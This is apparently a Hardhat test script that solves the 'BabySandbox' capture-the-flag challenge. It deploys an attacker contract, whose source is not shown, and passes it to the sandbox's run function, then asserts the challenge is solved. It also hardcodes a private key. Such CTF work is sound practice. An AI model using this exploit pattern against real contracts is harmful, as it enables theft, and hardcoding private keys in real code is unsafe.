import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { deployOrGetAt, getEoaOrPrivateKey } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let eoaAddress: string;
let attacker: Contract;
let setup: Contract; // setup contract
let sandbox: Contract;
let tx: any;

before(async () => {
  eoa = await getEoaOrPrivateKey(
    `0x2753d38d7ed30a2d0e74b2c5562eb88fc4f38344f9ff739d7adcaaa308e3a346`
  );
  eoaAddress = await eoa.getAddress();

  setup = await deployOrGetAt(
    `contracts/babysandbox/public/contracts/Setup.sol:Setup`,
    `0xD94087028F7cb4167CC3b0F7798F8B45f00bB968`,
    eoa
  );
  sandbox = await (
    await ethers.getContractAt(`BabySandbox`, await setup.sandbox())
  ).connect(eoa);
});

it("solves the challenge", async function () {
  const attackerFactory = await ethers.getContractFactory(
    `BabySandboxAttacker`,
    eoa
  );
  attacker = await attackerFactory.deploy();
  attacker.connect(eoa);

  tx = await sandbox.run(attacker.address, {
    gasLimit: BigNumber.from(`1000000`),
  });
  await tx.wait();

  // tx = await attacker.fallback({ gasLimit: BigNumber.from(`1000000`)});
  // await tx.wait();

  // const sandboxAbi = ["function run(address code)"];
  // let iface = new ethers.utils.Interface(sandboxAbi);
  // let data = iface.encodeFunctionData(`run`, [attacker.address])

  // console.log(`data`, data)
  // tx = await eoa.sendTransaction({
  //   from: await eoa.getAddress(),
  //   to: sandbox.address,
  //   data,
  //   gasLimit: BigNumber.from(`100000`),
  //   value: 0
  // })
  // await tx.wait();
  // PCTF
});

after(async () => {
  expect(await setup.isSolved()).to.be.true;
});
